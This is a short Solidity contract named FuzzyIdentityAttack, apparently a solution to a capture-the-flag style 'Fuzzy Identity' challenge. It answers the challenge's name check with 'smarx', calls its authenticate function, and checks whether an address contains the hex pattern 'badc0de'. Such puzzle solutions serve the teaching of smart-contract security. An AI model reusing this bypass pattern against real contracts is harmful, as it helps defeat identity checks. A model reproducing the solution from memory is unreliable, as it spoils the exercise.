pragma solidity ^0.6.0;

import "interfaces/IFuzzyIdentityChallenge.sol";

contract FuzzyIdentityAttack {
    function name() external pure returns (bytes32) {
        return bytes32("smarx");
    }

    function attack(IFuzzyIdentityChallenge challengeContract) external {
        challengeContract.authenticate();
    }

    function isBadCode(address _addr) external pure returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}
